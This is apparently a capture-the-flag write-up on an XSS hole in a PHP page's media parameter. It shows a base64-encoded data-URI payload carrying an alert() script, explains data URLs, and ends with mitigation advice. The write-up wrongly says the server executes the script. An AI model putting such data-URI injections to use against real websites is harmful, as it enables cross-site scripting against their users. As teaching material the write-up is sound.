# Script Injection (Data URL/URI)

Inspecting the page reveals that the image is acually an HTML object. Knowing this we can pass in the url anything we want and the server should run it.

## How to exploit:

[Data URI](https://en.wikipedia.org/wiki/Data_URI_scheme)

Using the wiki page referenced above we see that the "data" URL is vulnrable to XSS injection.

For this to work we need to use [Base 64 encoding](https://www.base64encode.org/) on our script.
```bash
<script>alert("Boom!!!")</script>
```
Encoded with [Base 64](https://www.base64encode.org/) gives us:
```bash
PHNjcmlwdD5hbGVydCgiQm9vbSEhISIpPC9zY3JpcHQ+
```

Now modify the src value in the url as follows:
```bash
<ip>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiQm9vbSEhISIpPC9zY3JpcHQ+
```

This gets the server to execute our code and return the flag.

## A brief explination of Base 64:

Base64 is a group of binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. By consisting only in ASCII characters, base64 strings are generally url-safe, and that's why they can be used to encode data in Data URLs.

## A brief explination of Data URL's:

The data URI can be utilized to construct attack pages that attempt to obtain usernames and passwords from unsuspecting web users. It can also be used to get around cross-site scripting (XSS) restrictions, embedding the attack payload fully inside the address bar, and hosted via URL shortening services rather than needing a full website that is controlled by a third party. As a result, some browsers now block webpages from navigating to data URIs.

### Common problems when creating and using Data URL's

* Syntax: 
The format for data URLs is very simple, but it's easy to forget to put a comma before the "data" segment, or to incorrectly encode the data into base64 format.
Formatting in HTML
A data URL provides a file within a file, which can potentially be very wide relative to the width of the enclosing document. As a URL, the data should be formatable with whitespace (linefeed, tab, or spaces), but there are practical issues that arise when using base64 encoding.

* Length limitations: 
Although Firefox supports data URLs of essentially unlimited length, browsers are not required to support any particular maximum length of data. For example, the Opera 11 browser limited URLs to 65535 characters long which limits data URLs to 65529 characters (65529 characters being the length of the encoded data, not the source, if you use the plain data:, without specifying a MIME type).
Lack of error handling
Invalid parameters in media, or typos when specifying 'base64', are ignored, but no error is provided.

* No support for query strings, etc: 
The data portion of a data URL is opaque, so an attempt to use a query string (page-specific parameters, with the syntax <url>?parameter-data) with a data URL will just include the query string in the data the URL represents.

* Security issues: 
A number of security issues (e.g. phishing) have been associated with data URLs, and navigating to them in the browser's top level. To mitigate such issues, top-level navigation to data:// URLs has been blocked in Firefox 59+ (release version, Nightly/Beta from 58), and we hope to see other browsers follow suit soon. See Blocking Top-Level Navigations to data URLs for Firefox 58 for more details.

## How to protect against:

In this case it would be advised not to use a Data URL to display an image. A simple <img> tag would have been more secure and not expose this page to XSS injection.

Using the right tool for the right job and understanding the vulnribilities of certain tools or objects that you are using.

## Resources:
* <https://snyk.io/vuln/npm:marked:20170112>
* <https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs>
* <https://en.wikipedia.org/wiki/Data_URI_scheme>